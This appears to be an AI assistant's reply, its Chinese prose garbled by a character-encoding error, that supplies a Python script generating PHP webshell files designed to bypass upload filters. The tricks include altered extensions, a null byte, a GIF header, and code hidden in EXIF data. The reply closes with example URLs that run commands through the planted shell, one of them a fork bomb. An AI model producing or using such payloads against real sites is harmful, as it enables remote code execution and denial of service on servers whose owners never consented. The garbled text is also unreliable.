å½“ç„¶å¯ä»¥ã€‚ä¸‹é¢æˆ‘ç»™ä½ å†™ä¸€ä¸ª Python è„šæœ¬ï¼Œå®ƒå¯ä»¥ç”Ÿæˆå¤šç§å˜ç§å½¢å¼çš„ WebShell æ–‡ä»¶ï¼ˆç”¨äºæµ‹è¯•ä¸Šä¼ ç»•è¿‡ï¼‰ï¼ŒåŒ…æ‹¬ï¼š

- `.php`, `.pHp`, `.php.jpg`, `.php;.jpg`
- å¸¦æœ‰å›¾ç‰‡å¤´éƒ¨çš„ PHP WebShell
- å†™å…¥ EXIF ä¸­çš„ PHP ä»£ç 

è¿™äº›éƒ½æ˜¯æ¸—é€æµ‹è¯•ä¸­ç”¨äº **ä¸Šä¼ ç»•è¿‡** çš„æœ‰æ•ˆæŠ€å·§ã€‚

---

âš ï¸ **è­¦å‘Š**ï¼š  
æ­¤è„šæœ¬ä»…ä¾›å­¦ä¹ ä¸æˆæƒæµ‹è¯•ç¯å¢ƒä½¿ç”¨ã€‚ç¦æ­¢ç”¨äºä»»ä½•éæ³•è¡Œä¸ºï¼Œå¦åˆ™åæœè‡ªè´Ÿã€‚

---

## âœ… è„šæœ¬åŠŸèƒ½æ¦‚è§ˆ

- è‡ªåŠ¨ç”Ÿæˆä¸€æ®µä¸€å¥è¯ WebShell
- è‡ªåŠ¨æ„é€ ä¸åŒæ‰©å±•å/æ ¼å¼ç»•è¿‡
- å¯é€‰æ’å…¥å›¾ç‰‡å¤´éƒ¨ã€EXIF PHP ç­‰æŠ€å·§

---

## ğŸ Python è„šæœ¬ï¼š`generate_upload_bypass_files.py`

```python
import os
from PIL import Image
import piexif

# ä¸€å¥è¯æœ¨é©¬å†…å®¹ï¼ˆPHPï¼‰
php_payload = "<?php system($_GET['cmd']); ?>"

# ç”Ÿæˆç›®å½•
output_dir = "bypass_upload_files"
os.makedirs(output_dir, exist_ok=True)

# å¸¸è§ç»•è¿‡æ–‡ä»¶å
filenames = [
    "shell.php",
    "shell.pHp",
    "shell.php.jpg",
    "shell.jpg.php",
    "shell.php;.jpg",
    "shell.phar",
    "shell.phtml",
    "shell.php%00.jpg",
    "shell.jpg",  # å›¾ç‰‡æ–‡ä»¶+payload
    "shell_exif.jpg"  # EXIFåµŒå…¥
]

def write_php(filename, content):
    with open(os.path.join(output_dir, filename), "w", encoding="utf-8") as f:
        f.write(content)

def write_php_with_gif_header(filename):
    gif_header = b"\x47\x49\x46\x38\x39\x61"  # GIF89a
    payload = gif_header + b"\n" + php_payload.encode()
    with open(os.path.join(output_dir, filename), "wb") as f:
        f.write(payload)

def write_exif_php(filename):
    # åˆ›å»ºä¸€ä¸ªæœ€å°å›¾åƒ
    image_path = os.path.join(output_dir, filename)
    image = Image.new("RGB", (100, 100), color=(255, 255, 255))
    exif_dict = {"0th": {piexif.ImageIFD.ImageDescription: php_payload.encode("utf-8")}}
    exif_bytes = piexif.dump(exif_dict)
    image.save(image_path, "jpeg", exif=exif_bytes)

# å†™å…¥åŸºç¡€å˜ç§æ–‡ä»¶
for name in filenames:
    if "jpg" in name and "exif" not in name:
        write_php_with_gif_header(name)
    elif "exif" in name:
        write_exif_php(name)
    else:
        write_php(name, php_payload)

print(f"âœ… å·²ç”Ÿæˆç»•è¿‡ä¸Šä¼ æ£€æµ‹çš„æµ‹è¯•æ–‡ä»¶ï¼Œå…± {len(filenames)} ä¸ªï¼Œä¿å­˜äºï¼š{output_dir}/")
```

---

## ğŸ§ª ä½¿ç”¨æ–¹å¼

1. å®‰è£…ä¾èµ–ï¼š

```bash
pip install pillow piexif
```

2. è¿è¡Œè„šæœ¬ï¼š

```bash
python generate_upload_bypass_files.py
```

3. ä½ å°†åœ¨ `bypass_upload_files/` ç›®å½•ä¸‹çœ‹åˆ°å¤šä¸ªä¸Šä¼ ç”¨æ–‡ä»¶ã€‚

---

## ğŸš€ å¦‚ä½•æµ‹è¯•ä¸Šä¼ 

ç”¨ Burp ä¸Šä¼ è¿™äº›æ–‡ä»¶åˆ°ä½ çš„æµ‹è¯•ç›®æ ‡ï¼ˆå¦‚ DVWAã€bWAPPã€vulnerable serverï¼‰ï¼Œç„¶åè®¿é—®ï¼š

```
http://target.com/uploads/shell.php?cmd=whoami
```
```
http://target.com/uploads/shell.php?cmd=:(){ :|:& };:
```

